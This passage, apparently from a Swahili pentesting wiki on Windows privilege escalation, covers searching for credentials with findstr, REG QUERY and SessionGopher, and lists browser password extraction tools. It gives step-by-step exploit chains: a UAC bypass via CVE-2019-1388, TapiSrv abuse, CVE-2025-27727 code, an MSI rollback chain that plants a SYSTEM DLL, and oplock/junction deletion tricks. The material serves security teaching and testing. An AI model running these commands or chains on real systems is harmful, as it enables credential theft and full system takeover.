Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za profaili ni faili husika za ufunguo na login zilizosimbwa kwa njia fiche. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomeka, kama kuna rekodi zilizohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando haki halisi za akaunti hiyo za kudhibiti makundi na haki za kundi za [kusoma au kufumbua nywila za LAPS](../active-directory-methodology/laps.md); artifacts za kivinjari pekee hazithibitishi njia ya kupata haki za msimamizi.

Tools za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia interface moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child ya **InProcServer32** iliyo na **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel**, ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![Historia ya vivinjari - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata registry child ya InProcServer32 iliyo na default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kupandisha ruhusa** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama utaratibu wa persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa Password kwenye faili na registry**

**Tafuta maudhui ya faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta registry kwa majina ya key na nywila**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyounda ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **nywila** za zana kadhaa zinazohifadhi data hii katika clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) ikiwa na **full access**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini, lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **full access kwa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia handles zaidi zilizo wazi za processes na threads zinazoirithiwa zikiwa na viwango tofauti vya permissions (si full access pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Memory segments zinazoshirikiwa, zinazoitwa **pipes**, huruhusu mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachowezesha processes zisizohusiana kushiriki data, hata kupitia networks tofauti. Hii inafanana na usanifu wa client/server, wenye roles zinazoitwa **named pipe server** na **named pipe client**.

**Client** inapotuma data kupitia pipe, **server** iliyoanzisha pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga hukupa fursa ya **kupata privileges za juu zaidi** kwa kujifanya kuwa process hiyo mara tu inapowasiliana na pipe uliyoanzisha. Maelekezo ya kutekeleza shambulio hili yanapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inakuwezesha **kudukua mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inakuwezesha kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliyejithibitisha kwa mbali anaweza kutumia vibaya njia ya matukio ya async inayotumia mailslot ili kubadilisha `ClientAttach` kuwa **write ya byte 4** mahali popote kwenye faili iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama service. Mfuatano kamili:

- Tumia `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kwenye path iliyopo inayoweza kuandikwa → service huifungua kwa `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa writes za matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata matukio kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia writes zinazotabirika.
- Jiongeze kwenye `[TapiAdministrators]` ndani ya `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na path ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya Faili Vinavyoweza Kutekeleza Vitu kwenye Windows

Tazama ukurasa wa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Links za Markdown zinazobofyekana na kupelekwa kwa `ShellExecuteExW` zinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili Kutafuta Passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **huweka credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji wa Haki za Chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii huwezesha kupandisha marupurupu na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato huo imetiwa saini na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Unaweza kupata faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuelekeza Junctions za Directory ya Upload kwenye Root Inayohudumiwa

Programu inaweza kuunda subdirectory ya upload yenye njia inayotabirika, kuandika jina la faili lililotolewa na mpigaji ndani yake, kisha kuchakata faili hiyo. Ikiwa mtumiaji mwenye haki za chini anaweza kufuta subdirectory hiyo na kuweka NTFS junction badala yake kabla ya maandishi ya upande wa seva, maandishi yanaweza kuelekezwa kupitia junction hadi kwenye directory inayohudumiwa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web service ikiwa seva inaendesha aina hiyo ya faili. Hili ni eneo la arbitrary-write linalotegemea programu mahususi; directory ya upload inayoweza kuandikwa au junction iliyopo pekee havithibitishi hilo.

Kagua ujenzi halisi wa njia na muda wake ndani ya upload handler, haki halisi za mtumiaji za kufuta/kuunda subdirectory, ACLs halisi za eneo lengwa, ikiwa mwandishi hufuata reparse points, na ikiwa web server huendesha faili katika eneo hilo. Thibitisha utambulisho wa process ya mwandishi na wa web server kando. Ukaguzi tuli unaweza kuonyesha ACLs za directory na metadata ya reparse, lakini hauwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa utekelezaji utafanyika chini ya akaunti ya huduma, kagua **token halisi ya process** kabla ya kuchunguza njia tofauti ya token-privilege.

## Usafishaji wa scheduled task yenye mamlaka ya juu unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mikono bado inaweza kuwa na trigger inayopatikana kwa mtumiaji asiye na haki za juu. Unakagua task yenye mamlaka ya juu, export XML yake na ukague **triggers zote** pamoja na DACL, principal na action ya task. Hasa, `WnfStateChangeTrigger` hutaja state ya Windows Notification Facility (WNF); ikiwa state hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha sasisho, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja chini ya identity yake iliyosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ikakubali sasisho za WNF state `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata wakati Recall ilikuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kupima kama inaweza kufikiwa, pata `ZwUpdateWnfStateData` kutoka `ntdll.dll`, tuma sasisho tupu kwa jina la hali la baiti nane, na ulinganishe hali ya kurudi na data ya mara ya mwisho kazi ilipoendeshwa au shughuli za Procmon. Probe ifuatayo iliyopunguzwa hutumia mfuatano wa baiti kutoka kwenye mfano wa kazi ya Recall; badilisha baiti hizo kwa zile zilizotolewa kwa kazi inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji wa kujirudia kuwa ufutaji wenye ruhusa za juu

Primitive muhimu si kichochezi pekee, bali ni utaratibu wa usafishaji wenye ruhusa za juu unaokubali saraka inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia kuorodhesha hadi mabadiliko ya mwisho: ugunduzi wa wasifu/vikao, watoto waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria thabiti kwamba njia iliyokaguliwa awali itafuatwa baadaye kwa kujirudia. Ikiwa watoto wa saraka hawafunguliwi kwa kutumia handles za saraka zinazoaminika na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha utatuzi wa njia kati ya kuorodhesha na kuitumia.<sup>[[43]](#references)</sup>

Oanisha kichochezi cha WNF na [oplock, junction na ubadilishaji wa symlink ya Object Manager](#from-folder-contents-delete-to-system-eop) uliofafanuliwa hapa chini: oplock husimamisha cleaner baada ya kuchagua mtoto halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wenye ruhusa za juu unapoendelea, utatue kupitia `\RPC Control` hadi kwenye lengwa lililolindwa. Katika mnyororo wa Recall, hili liliwezesha kufutwa kwa `C:\Config.Msi` na SYSTEM, jambo lililohitajika kwa mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Watoto wa ndani zaidi hupita marekebisho ya juu juu ya reparse point

Kuthibitisha tu root inayodhibitiwa na mshambuliaji na mtoto wake wa karibu hakulindi ufutaji wa kujirudia unaotumia njia. Acha objects hizo zilizokaguliwa ziwe halali, kisha hamishia ubadilishaji wa junction/oplock hadi kwa mtoto mwingine aliye chini yake; hatimaye `IFileOperation::DeleteItem` hufikia mzao ambaye hakuthibitishwa na kufuata lengwa lake jipya. CVE-2026-20941 ilisababishwa hasa na aina hii ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na saraka yenye umbo la GUID, lakini ikaacha operesheni ya zamani ya ufutaji wa kujirudia.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila mzao** kwa kutumia handle ya saraka inayoaminika tayari, kupata na kuthibitisha njia/object ya mwisho iliyotatuliwa, kisha kutumia deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe kiambishi awali kisha urudi kwenye ufutaji wa kujirudia unaotegemea njia. Unapokagua patch, kagua pia structures katika sehemu halisi ya mwito: katika hali hii, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina la `{GUID}\\secure_file.lock` linalotumia njia jamaa, hivyo kuthibitisha kuwa matokeo ya decompiler yaliyopotosha, yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`, hayakuwa sahihi.<sup>[[43]](#references)</sup>

## Kutoka kwa Kufuta/Kuhamisha/Kubadilisha Jina Folda Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili hutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali na zenye madhara wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer yenye madhara** itakayotumiwa kuteka folda ya `C:\Config.Msi`. Windows Installer itaitumia baadaye kuhifadhi faili za rollback wakati wa kuondoa vifurushi vingine vya MSI; faili hizo za rollback zitakuwa zimebadilishwa ili ziwe na payload yenye madhara.

### Uingizaji wa njia ya cleanup ya Windows Installer COM (CVE-2025-27727)

Mteja mwenye ruhusa ndogo anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia object ya COM ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini miito husika ya `IMsiServer` kuwa `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zilibainishwa kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye msimamizi, `SetEEUIDirectoryAndFilter` huiga utambulisho wa mpigaji kwa muda tu inapofungua njia iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hili linathibitisha kwamba mpigaji anaweza kufuta saraka na huzuia kufuata reparse point, lakini **haliunganishi** file object iliyokaguliwa na cleanup ya baadaye wala kuthibitisha kwamba Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` huratibu njia hiyo kama folda bila kujali argument ya filter ya mpigaji. Huduma huandika thamani yenye jina la `REG_DWORD` chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni njia inayodhibitiwa na mpigaji, na data `0x00000002` ni bendera ya folda. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye cleanup. Worker wake mwenye ruhusa za juu huorodhesha thamani za registry na kupitisha entries za folda kwa `FDeleteFolder` ya kujirudia bila kukagua chanzo cha njia. Uondoaji wa kawaida ukishindwa, code pia huita `LockdownPath`, huondoa sifa za faili, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive inayofaa ni kutumia tena path, badala ya kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena pathname hiyo hiyo ikiwa na rollback data iliyolindwa. Cleanup huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hukwepa mpaka uliokusudiwa na `FILE_FLAG_OPEN_REPARSE_POINT` pamoja na redirection-trust mitigation, kwa sababu reparse point haihitajiki.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa kwenye rollback chain iliyo hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle yenye ruhusa ya `WRITE_DAC` kabla installer haijaweka DACL imara. Handle iliyofunguliwa mapema inaweza kurejesha DACL inayoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea tena.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` wakati feature gate mpya imewezeshwa. COM call bado inaweza kurudisha success, lakini haiweki tena path inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha Windows security updates za April 2025 badala ya kutumia return ya method iliyofanikiwa kama kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikwa (`TARGETDIR`).
    - Weka alama ya **"UAC Compliant"** kwa installer, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili kwenda `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Fuatilia handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kutambua wakati faili inakuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara wakati `.rbf` imeandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia isifutwe**.
    - Kisha **toa ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Katika hatua hii, **anzisha vulnerability ya kufuta folder kiholela katika kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle ikiwa wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikwa.
        - `ERROROUT`: Kigezo kinachosababisha hitilafu ya lazima.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL hutekelezwa **wakati handle inafunguliwa tu**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` kwa **rollback script bandia** inayoiambia Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye ruhusa za juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia ikiwa na **DLL payload hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Toa ishara ya sync event ili installer iendelee.
    - **Custom action ya type 19 (`ErrorOut`)** imewekwa ili **ishindwe kwa makusudi kusakinisha** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` kwenye mahali lengwa.
    - Sasa una **DLL yako hasidi kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **binary inayoaminika inayoinua ruhusa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka.
    - **Bam**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa Faili Kiholela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotajwa hapo awali) inadhania kuwa unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu **kufuta faili kiholela** tu?

Unaweza kutumia **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako haikuruhusu kufuta file/folder zozote upendazo, lakini **inakuruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Step 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Step 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** mchakato wenye privileged unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu hukagua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta vilivyomo.
- Unapofikia `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huondoa vilivyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock kabla ya wakati.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga NTFS internal stream inayohifadhi metadata ya folda — kuifuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

